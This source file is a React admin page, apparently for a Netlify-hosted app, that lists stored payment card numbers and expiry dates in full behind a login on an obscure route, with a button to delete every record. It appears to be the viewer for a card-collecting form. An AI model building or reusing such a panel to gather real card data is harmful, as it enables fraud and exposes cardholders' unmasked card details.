import { createFileRoute, useNavigate } from '@tanstack/react-router'
import { useState, useEffect } from 'react'
import { getUser, logout } from '@netlify/identity'

interface Submission {
  id: string
  cardNumber: string
  expiry: string
  timestamp: string
}

function SubmissionsPage() {
  const [submissions, setSubmissions] = useState<Submission[]>([])
  const [loading, setLoading] = useState(true)
  const [purging, setPurging] = useState(false)
  const [message, setMessage] = useState('')
  const [authChecked, setAuthChecked] = useState(false)
  const [userEmail, setUserEmail] = useState('')
  const navigate = useNavigate()

  useEffect(() => {
    async function checkAuth() {
      const user = await getUser()
      if (!user) {
        navigate({ to: '/login' })
        return
      }
      setUserEmail(user.email ?? '')
      setAuthChecked(true)
    }
    checkAuth()
  }, [navigate])

  const fetchSubmissions = async () => {
    setLoading(true)
    try {
      const res = await fetch('/api/submissions')
      if (res.status === 401) {
        navigate({ to: '/login' })
        return
      }
      const data = await res.json()
      setSubmissions(data.submissions || [])
    } catch {
      setMessage('Error al cargar los datos')
    } finally {
      setLoading(false)
    }
  }

  useEffect(() => {
    if (authChecked) fetchSubmissions()
  }, [authChecked])

  const handleLogout = async () => {
    try {
      await logout()
    } catch {
      // continue
    }
    navigate({ to: '/login' })
  }

  const handlePurge = async () => {
    if (!confirm('¿Eliminar TODOS los registros? Esta acción no se puede deshacer.')) return
    setPurging(true)
    try {
      const res = await fetch('/api/submissions', { method: 'DELETE' })
      const data = await res.json()
      setMessage(`${data.deleted} registro(s) eliminados`)
      setSubmissions([])
    } catch {
      setMessage('Error al purgar')
    } finally {
      setPurging(false)
    }
  }

  const formatCard = (num: string) => {
    const digits = num.replace(/\s/g, '')
    if (digits.length <= 4) return digits
    return digits.replace(/(.{4})/g, '$1 ').trim()
  }

  if (!authChecked) {
    return (
      <div style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        fontFamily: 'VT323, monospace',
        color: '#60a5fa',
        fontSize: '24px',
        letterSpacing: '4px',
      }}>
        VERIFICANDO ACCESO...
      </div>
    )
  }

  return (
    <>
      <style>{`
        .viewer-container {
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          padding: 40px 20px;
          font-family: 'VT323', monospace;
          color: #93bbfc;
        }
        .viewer-panel {
          width: 100%;
          max-width: 600px;
          background: rgba(15,23,42,0.9);
          border: 1px solid rgba(59,130,246,0.25);
          border-radius: 14px;
          padding: 28px;
          box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .viewer-title {
          font-size: 26px;
          color: #60a5fa;
          letter-spacing: 4px;
          margin-bottom: 20px;
        }
        .viewer-btn {
          padding: 10px 20px;
          background: rgba(37,99,235,0.18);
          border: 1px solid rgba(96,165,250,0.6);
          border-radius: 8px;
          color: #93bbfc;
          font-family: 'VT323', monospace;
          font-size: 16px;
          letter-spacing: 2px;
          cursor: pointer;
          transition: all 0.2s;
        }
        .viewer-btn:hover {
          background: rgba(37,99,235,0.3);
          color: #fff;
        }
        .viewer-btn-danger {
          background: rgba(239,68,68,0.15);
          border-color: rgba(239,68,68,0.5);
          color: #fca5a5;
        }
        .viewer-btn-danger:hover {
          background: rgba(239,68,68,0.3);
          color: #fff;
        }
        .sub-row {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 12px;
          border-bottom: 1px solid rgba(59,130,246,0.1);
        }
        .sub-row:last-child { border-bottom: none; }
        .sub-card { font-size: 20px; color: #3b82f6; letter-spacing: 2px; }
        .sub-expiry { font-size: 16px; color: rgba(59,130,246,0.6); }
        .sub-date { font-size: 13px; color: rgba(59,130,246,0.35); }
        .msg-bar {
          padding: 10px;
          border-radius: 8px;
          background: rgba(59,130,246,0.1);
          border: 1px solid rgba(59,130,246,0.2);
          margin-bottom: 16px;
          font-size: 16px;
          text-align: center;
        }
      `}</style>

      <div className="viewer-container">
        <div className="viewer-panel">
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' }}>
            <div className="viewer-title" style={{ marginBottom: 0 }}>REGISTROS GUARDADOS</div>
            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '4px' }}>
              <span style={{ fontSize: '12px', color: 'rgba(59,130,246,0.4)' }}>{userEmail}</span>
              <button className="viewer-btn" onClick={handleLogout} style={{ padding: '4px 12px', fontSize: '13px' }}>
                CERRAR SESIÓN
              </button>
            </div>
          </div>

          {message && <div className="msg-bar">{message}</div>}

          <div style={{ display: 'flex', gap: '10px', marginBottom: '20px', flexWrap: 'wrap' }}>
            <button className="viewer-btn" onClick={fetchSubmissions} disabled={loading}>
              {loading ? 'CARGANDO...' : 'ACTUALIZAR'}
            </button>
            {submissions.length > 0 && (
              <button className="viewer-btn viewer-btn-danger" onClick={handlePurge} disabled={purging}>
                {purging ? 'ELIMINANDO...' : `PURGAR TODO (${submissions.length})`}
              </button>
            )}
            <a href="/" style={{ textDecoration: 'none' }}>
              <button className="viewer-btn">← VOLVER</button>
            </a>
          </div>

          <div style={{ fontSize: '14px', color: 'rgba(59,130,246,0.4)', marginBottom: '16px' }}>
            TOTAL: {submissions.length} registro(s) · Almacenado en Netlify Blobs (key-value)
          </div>

          {loading && submissions.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '40px 0', color: 'rgba(59,130,246,0.4)' }}>
              Cargando...
            </div>
          ) : submissions.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '40px 0', color: 'rgba(59,130,246,0.3)' }}>
              No hay registros aún. Los datos aparecerán aquí cuando envíes el formulario.
            </div>
          ) : (
            <div>
              {submissions.map((sub) => (
                <div className="sub-row" key={sub.id}>
                  <div>
                    <div className="sub-card">{formatCard(sub.cardNumber)}</div>
                    <div className="sub-expiry">EXP: {sub.expiry}</div>
                  </div>
                  <div className="sub-date">
                    {new Date(sub.timestamp).toLocaleString('es-MX')}
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </>
  )
}

export const Route = createFileRoute('/perrito33')({
  component: SubmissionsPage,
})
